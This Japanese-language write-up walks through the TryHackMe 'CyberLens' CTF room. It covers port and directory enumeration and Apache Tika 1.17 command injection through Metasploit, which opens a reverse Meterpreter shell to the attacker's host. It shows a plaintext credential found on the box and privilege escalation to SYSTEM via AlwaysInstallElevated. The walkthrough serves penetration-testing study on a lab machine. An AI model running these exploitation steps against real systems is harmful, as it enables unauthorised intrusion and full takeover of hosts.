# CyberLens CTF

https://tryhackme.com/room/cyberlensp6

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.209.164
root@ip-10-10-197-163:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-06 06:16 GMT
Nmap scan report for 10.10.209.164
Host is up (0.00038s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
61777/tcp open  unknown
MAC Address: 02:4B:12:FD:C0:D5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 338.89 seconds

root@ip-10-10-197-163:~# sudo nmap -sV -p80,135,139,445,3389,5985,47001,49664-49670,49673,61777 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-06 06:27 GMT
Nmap scan report for 10.10.209.164
Host is up (0.00049s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
MAC Address: 02:4B:12:FD:C0:D5 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.04 seconds
```

### gobuster

```shell
root@ip-10-10-197-163:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.164
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.209.164/images/]
/Images               (Status: 301) [Size: 236] [--> http://10.10.209.164/Images/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.209.164/css/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.209.164/js/]
/IMAGES               (Status: 301) [Size: 236] [--> http://10.10.209.164/IMAGES/]
/%20                  (Status: 403) [Size: 199]
/*checkout*           (Status: 403) [Size: 199]
/CSS                  (Status: 301) [Size: 233] [--> http://10.10.209.164/CSS/]
/JS                   (Status: 301) [Size: 232] [--> http://10.10.209.164/JS/]
/*docroot*            (Status: 403) [Size: 199]
/*                    (Status: 403) [Size: 199]
/con                  (Status: 403) [Size: 199]
/http%3A              (Status: 403) [Size: 199]
/**http%3a            (Status: 403) [Size: 199]
/*http%3A             (Status: 403) [Size: 199]
/aux                  (Status: 403) [Size: 199]
/**http%3A            (Status: 403) [Size: 199]
/%C0                  (Status: 403) [Size: 199]
/%3FRID%3D2671        (Status: 403) [Size: 199]
/devinmoore*          (Status: 403) [Size: 199]
/200109*              (Status: 403) [Size: 199]
/*sa_                 (Status: 403) [Size: 199]
/*dc_                 (Status: 403) [Size: 199]
/%D8                  (Status: 403) [Size: 199]
/%CC                  (Status: 403) [Size: 199]
/%CD                  (Status: 403) [Size: 199]
/%CE                  (Status: 403) [Size: 199]
/%CA                  (Status: 403) [Size: 199]
/%CF                  (Status: 403) [Size: 199]
/%D0                  (Status: 403) [Size: 199]
/%D1                  (Status: 403) [Size: 199]
/%CB                  (Status: 403) [Size: 199]
/%D6                  (Status: 403) [Size: 199]
/%D4                  (Status: 403) [Size: 199]
/%D2                  (Status: 403) [Size: 199]
/%D5                  (Status: 403) [Size: 199]
/%D7                  (Status: 403) [Size: 199]
/%D3                  (Status: 403) [Size: 199]
/%C8                  (Status: 403) [Size: 199]
/%C9                  (Status: 403) [Size: 199]
/%C1                  (Status: 403) [Size: 199]
/%C2                  (Status: 403) [Size: 199]
/%C7                  (Status: 403) [Size: 199]
/%C6                  (Status: 403) [Size: 199]
/%C5                  (Status: 403) [Size: 199]
/%C3                  (Status: 403) [Size: 199]
/%C4                  (Status: 403) [Size: 199]
/%D9                  (Status: 403) [Size: 199]
/%DE                  (Status: 403) [Size: 199]
/%DF                  (Status: 403) [Size: 199]
/%DD                  (Status: 403) [Size: 199]
/%DB                  (Status: 403) [Size: 199]
/login%3f             (Status: 403) [Size: 199]
/%22julie%20roehm%22  (Status: 403) [Size: 199]
/%22britney%20spears%22 (Status: 403) [Size: 199]
/%22james%20kim%22    (Status: 403) [Size: 199]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-197-163:~# gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.209.164
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 199]
/images               (Status: 301) [Size: 236] [--> http://10.10.209.164/images/]
/index.html           (Status: 200) [Size: 8780]
/contact.html         (Status: 200) [Size: 4880]
/about.html           (Status: 200) [Size: 6254]
/Images               (Status: 301) [Size: 236] [--> http://10.10.209.164/Images/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.209.164/css/]
/Contact.html         (Status: 200) [Size: 4880]
/About.html           (Status: 200) [Size: 6254]
/Index.html           (Status: 200) [Size: 8780]
/js                   (Status: 301) [Size: 232] [--> http://10.10.209.164/js/]
/IMAGES               (Status: 301) [Size: 236] [--> http://10.10.209.164/IMAGES/]
/%20                  (Status: 403) [Size: 199]
/INDEX.html           (Status: 200) [Size: 8780]
/*checkout*.html      (Status: 403) [Size: 199]
/*checkout*           (Status: 403) [Size: 199]
/*checkout*.php       (Status: 403) [Size: 199]
/*checkout*.txt       (Status: 403) [Size: 199]
/CSS                  (Status: 301) [Size: 233] [--> http://10.10.209.164/CSS/]
/JS                   (Status: 301) [Size: 232] [--> http://10.10.209.164/JS/]
/*docroot*.txt        (Status: 403) [Size: 199]
/*docroot*.php        (Status: 403) [Size: 199]
/*docroot*            (Status: 403) [Size: 199]
/*docroot*.html       (Status: 403) [Size: 199]
/*.php                (Status: 403) [Size: 199]
/*.txt                (Status: 403) [Size: 199]
/*                    (Status: 403) [Size: 199]
/*.html               (Status: 403) [Size: 199]
/con.php              (Status: 403) [Size: 199]
/con.txt              (Status: 403) [Size: 199]
/con                  (Status: 403) [Size: 199]
/con.html             (Status: 403) [Size: 199]
/CONTACT.html         (Status: 200) [Size: 4880]
/http%3A.php          (Status: 403) [Size: 199]
/http%3A.txt          (Status: 403) [Size: 199]
/http%3A.html         (Status: 403) [Size: 199]
/http%3A              (Status: 403) [Size: 199]
/**http%3a.php        (Status: 403) [Size: 199]
/**http%3a            (Status: 403) [Size: 199]
/**http%3a.txt        (Status: 403) [Size: 199]
/**http%3a.html       (Status: 403) [Size: 199]
/*http%3A.php         (Status: 403) [Size: 199]
/*http%3A.txt         (Status: 403) [Size: 199]
/*http%3A.html        (Status: 403) [Size: 199]
/*http%3A             (Status: 403) [Size: 199]
/aux.html             (Status: 403) [Size: 199]
/aux                  (Status: 403) [Size: 199]
/aux.php              (Status: 403) [Size: 199]
/aux.txt              (Status: 403) [Size: 199]
/ABOUT.html           (Status: 200) [Size: 6254]
/**http%3A.txt        (Status: 403) [Size: 199]
/**http%3A.php        (Status: 403) [Size: 199]
/**http%3A.html       (Status: 403) [Size: 199]
/**http%3A            (Status: 403) [Size: 199]
/%C0                  (Status: 403) [Size: 199]
/%C0.txt              (Status: 403) [Size: 199]
/%C0.php              (Status: 403) [Size: 199]
/%C0.html             (Status: 403) [Size: 199]
/%3FRID%3D2671        (Status: 403) [Size: 199]
/%3FRID%3D2671.html   (Status: 403) [Size: 199]
/%3FRID%3D2671.txt    (Status: 403) [Size: 199]
/%3FRID%3D2671.php    (Status: 403) [Size: 199]
/devinmoore*          (Status: 403) [Size: 199]
/devinmoore*.txt      (Status: 403) [Size: 199]
/devinmoore*.html     (Status: 403) [Size: 199]
/devinmoore*.php      (Status: 403) [Size: 199]
/200109*.php          (Status: 403) [Size: 199]
/200109*.html         (Status: 403) [Size: 199]
/200109*              (Status: 403) [Size: 199]
/200109*.txt          (Status: 403) [Size: 199]
/*sa_.txt             (Status: 403) [Size: 199]
/*sa_                 (Status: 403) [Size: 199]
/*sa_.html            (Status: 403) [Size: 199]
/*dc_.html            (Status: 403) [Size: 199]
/*sa_.php             (Status: 403) [Size: 199]
/*dc_.php             (Status: 403) [Size: 199]
/*dc_                 (Status: 403) [Size: 199]
/*dc_.txt             (Status: 403) [Size: 199]
/%D8.txt              (Status: 403) [Size: 199]
/%CF                  (Status: 403) [Size: 199]
/%D8.html             (Status: 403) [Size: 199]
/%D8                  (Status: 403) [Size: 199]
/%D8.php              (Status: 403) [Size: 199]
/%CE                  (Status: 403) [Size: 199]
/%CE.txt              (Status: 403) [Size: 199]
/%CE.php              (Status: 403) [Size: 199]
/%CF.txt              (Status: 403) [Size: 199]
/%CF.php              (Status: 403) [Size: 199]
/%CF.html             (Status: 403) [Size: 199]
/%CD.txt              (Status: 403) [Size: 199]
/%CE.html             (Status: 403) [Size: 199]
/%CB                  (Status: 403) [Size: 199]
/%CC.txt              (Status: 403) [Size: 199]
/%CC.php              (Status: 403) [Size: 199]
/%CB.php              (Status: 403) [Size: 199]
/%CC.html             (Status: 403) [Size: 199]
/%CB.txt              (Status: 403) [Size: 199]
/%CC                  (Status: 403) [Size: 199]
/%CD.php              (Status: 403) [Size: 199]
/%CD.html             (Status: 403) [Size: 199]
/%CD                  (Status: 403) [Size: 199]
/%CB.html             (Status: 403) [Size: 199]
/%CA                  (Status: 403) [Size: 199]
/%CA.txt              (Status: 403) [Size: 199]
/%CA.html             (Status: 403) [Size: 199]
/%CA.php              (Status: 403) [Size: 199]
/%D0.php              (Status: 403) [Size: 199]
/%D0                  (Status: 403) [Size: 199]
/%D1.php              (Status: 403) [Size: 199]
/%D1                  (Status: 403) [Size: 199]
/%D0.html             (Status: 403) [Size: 199]
/%D0.txt              (Status: 403) [Size: 199]
/%D7.html             (Status: 403) [Size: 199]
/%D7.txt              (Status: 403) [Size: 199]
/%D7.php              (Status: 403) [Size: 199]
/%D7                  (Status: 403) [Size: 199]
/%D1.txt              (Status: 403) [Size: 199]
/%D6.php              (Status: 403) [Size: 199]
/%D6.html             (Status: 403) [Size: 199]
/%D6                  (Status: 403) [Size: 199]
/%D5.php              (Status: 403) [Size: 199]
/%D5.txt              (Status: 403) [Size: 199]
/%D6.txt              (Status: 403) [Size: 199]
/%D1.html             (Status: 403) [Size: 199]
/%D5                  (Status: 403) [Size: 199]
/%D5.html             (Status: 403) [Size: 199]
/%D3                  (Status: 403) [Size: 199]
/%D4.html             (Status: 403) [Size: 199]
/%D4.txt              (Status: 403) [Size: 199]
/%D4                  (Status: 403) [Size: 199]
/%D4.php              (Status: 403) [Size: 199]
/%D2                  (Status: 403) [Size: 199]
/%D3.txt              (Status: 403) [Size: 199]
/%D3.php              (Status: 403) [Size: 199]
/%D3.html             (Status: 403) [Size: 199]
/%D2.php              (Status: 403) [Size: 199]
/%D2.html             (Status: 403) [Size: 199]
/%D2.txt              (Status: 403) [Size: 199]
/%C9.php              (Status: 403) [Size: 199]
/%C9.txt              (Status: 403) [Size: 199]
/%C9                  (Status: 403) [Size: 199]
/%C8.php              (Status: 403) [Size: 199]
/%C8                  (Status: 403) [Size: 199]
/%C1.html             (Status: 403) [Size: 199]
/%C8.txt              (Status: 403) [Size: 199]
/%C1.php              (Status: 403) [Size: 199]
/%C1.txt              (Status: 403) [Size: 199]
/%C1                  (Status: 403) [Size: 199]
/%C8.html             (Status: 403) [Size: 199]
/%C9.html             (Status: 403) [Size: 199]
/%C2.txt              (Status: 403) [Size: 199]
/%C2.php              (Status: 403) [Size: 199]
/%C7.php              (Status: 403) [Size: 199]
/%C2                  (Status: 403) [Size: 199]
/%C7.txt              (Status: 403) [Size: 199]
/%C7                  (Status: 403) [Size: 199]
/%C2.html             (Status: 403) [Size: 199]
/%C7.html             (Status: 403) [Size: 199]
/%C6                  (Status: 403) [Size: 199]
/%C6.php              (Status: 403) [Size: 199]
/%C6.txt              (Status: 403) [Size: 199]
/%C6.html             (Status: 403) [Size: 199]
/%C5                  (Status: 403) [Size: 199]
/%C4.php              (Status: 403) [Size: 199]
/%C4                  (Status: 403) [Size: 199]
/%C5.html             (Status: 403) [Size: 199]
/%C3                  (Status: 403) [Size: 199]
/%C5.txt              (Status: 403) [Size: 199]
/%C5.php              (Status: 403) [Size: 199]
/%C3.txt              (Status: 403) [Size: 199]
/%C3.html             (Status: 403) [Size: 199]
/%C4.html             (Status: 403) [Size: 199]
/%C4.txt              (Status: 403) [Size: 199]
/%D9                  (Status: 403) [Size: 199]
/%C3.php              (Status: 403) [Size: 199]
/%D9.html             (Status: 403) [Size: 199]
/%D9.txt              (Status: 403) [Size: 199]
/%D9.php              (Status: 403) [Size: 199]
/%DF.html             (Status: 403) [Size: 199]
/%DD.php              (Status: 403) [Size: 199]
/%DF.txt              (Status: 403) [Size: 199]
/%DD.html             (Status: 403) [Size: 199]
/%DF.php              (Status: 403) [Size: 199]
/%DF                  (Status: 403) [Size: 199]
/%DE.txt              (Status: 403) [Size: 199]
/%DE.php              (Status: 403) [Size: 199]
/%DD.txt              (Status: 403) [Size: 199]
/%DD                  (Status: 403) [Size: 199]
/%DE.html             (Status: 403) [Size: 199]
/%DE                  (Status: 403) [Size: 199]
/%DB.php              (Status: 403) [Size: 199]
/%DB.txt              (Status: 403) [Size: 199]
/%DB                  (Status: 403) [Size: 199]
/%DB.html             (Status: 403) [Size: 199]
/login%3f             (Status: 403) [Size: 199]
/login%3f.html        (Status: 403) [Size: 199]
/login%3f.txt         (Status: 403) [Size: 199]
/login%3f.php         (Status: 403) [Size: 199]
/%22julie%20roehm%22  (Status: 403) [Size: 199]
/%22julie%20roehm%22.html (Status: 403) [Size: 199]
/%22james%20kim%22    (Status: 403) [Size: 199]
/%22britney%20spears%22 (Status: 403) [Size: 199]
/%22james%20kim%22.txt (Status: 403) [Size: 199]
/%22james%20kim%22.php (Status: 403) [Size: 199]
/%22julie%20roehm%22.txt (Status: 403) [Size: 199]
/%22julie%20roehm%22.php (Status: 403) [Size: 199]
/%22britney%20spears%22.php (Status: 403) [Size: 199]
/%22james%20kim%22.html (Status: 403) [Size: 199]
/%22britney%20spears%22.html (Status: 403) [Size: 199]
/%22britney%20spears%22.txt (Status: 403) [Size: 199]
Progress: 873100 / 873104 (100.00%)
===============================================================
Finished
===============================================================
```

画像アップロードの機能を使うと、http://cyberlens.thm:61777/ に向けて PUT リクエストしていた。

```http
PUT /meta HTTP/1.1
Host: cyberlens.thm:61777
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://cyberlens.thm/
Content-Type: application/octet-stream
Content-Length: 578496
Origin: http://cyberlens.thm
Connection: keep-alive
```

http://cyberlens.thm:61777/ で、Tika の Welcome 画面が表示される。

```text
Welcome to the Apache Tika 1.17 Server
```

```shell
$ searchsploit Tika 1.17
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                   | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                                     | windows/remote/46540.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

コマンドインジェクションの脆弱性がある。

## metasploit

```shell
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RHOSTS 10.10.209.164
RHOSTS => 10.10.209.164
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
RPORT => 61777
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(windows/http/apache_tika_jp2_jscript) > run

[*] Started reverse TCP handler on 10.2.22.182:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.10.209.164:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (176198 bytes) to 10.10.209.164
[*] Meterpreter session 1 opened (10.2.22.182:4444 -> 10.10.209.164:49842) at 2025-02-06 01:55:23 -0500

meterpreter >
```

meterpreter を取れた。

```shell
C:\Users\CyberLens>dir Desktop
dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens\Desktop

06/06/2023  07:53 PM    <DIR>          .
06/06/2023  07:53 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,858,534,912 bytes free

C:\Users\CyberLens>type Desktop\user.txt
type Desktop\user.txt
THM{T1k4.....}
```

ユーザーフラグゲット。

## 権限昇格

```shell
C:\Users\CyberLens>type Documents\Management\CyberLens-Management.txt
type Documents\Management\CyberLens-Management.txt
Remember, manual enumeration is often key in an engagement ;)

CyberLens
HackSmarter123
```

これを使って RDP 接続できる。

### sysinfo

```shell
C:\Users\CyberLens>systeminfo
systeminfo

Host Name:                 CYBERLENS
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA344
Original Install Date:     3/17/2021, 2:59:06 PM
System Boot Time:          2/6/2025, 6:12:29 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,483 MB
Virtual Memory: Max Size:  4,800 MB
Virtual Memory: Available: 3,190 MB
Virtual Memory: In Use:    1,610 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CYBERLENS
Hotfix(s):                 27 Hotfix(s) Installed.
                           [01]: KB4601555
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4486153
                           [06]: KB4493510
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4535680
                           [14]: KB4539571
                           [15]: KB4549947
                           [16]: KB4558997
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4577586
                           [21]: KB4577667
                           [22]: KB4587735
                           [23]: KB4589208
                           [24]: KB4598480
                           [25]: KB4601393
                           [26]: KB5000859
                           [27]: KB5001568
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.209.164
                                 [02]: fe80::99a4:af54:e90d:27c7
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

### 権限

```shell
C:\Users\CyberLens>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\CyberLens>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

### AlwaysInstallElevated

```shell
C:\>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

C:\>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
    DisableMSI    REG_DWORD    0x0
```

必要条件を満たしている。  
msfvenom でリバースシェル入りのインストーラを作る手順でもいけるが、エクスプロイトもあったのでそれを使う。

```shell
msf6 exploit(windows/local/always_install_elevated) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/always_install_elevated) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(windows/local/always_install_elevated) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/always_install_elevated) > run

[*] Started reverse TCP handler on 10.2.22.182:4445
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\VpImlS.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 10.10.209.164
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\VpImlS.msi
[*] Meterpreter session 3 opened (10.2.22.182:4445 -> 10.10.209.164:49858) at 2025-02-06 02:32:09 -0500

meterpreter > shell
Process 2660 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```shell
C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{3lev......}
```

管理者フラグゲット！

## 振り返り

- 貴重な Windows の CTF ありがたい。
- ステガノグラフィーを匂わせまくっていたが、全然関係なかった。
- 今回は AlwaysInstallElevated を手作業で発見できたが、suggester を使うとプラスアルファで他にも候補が出ていた。（他の 4 つは「かもしれない」レベル）

```shell
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.209.164 - Collecting local exploits for x86/windows...
[*] 10.10.209.164 - 196 exploit checks are being tried...
[+] 10.10.209.164 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.10.209.164 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.209.164 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.209.164 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.209.164 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 41 / 41
[*] 10.10.209.164 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```
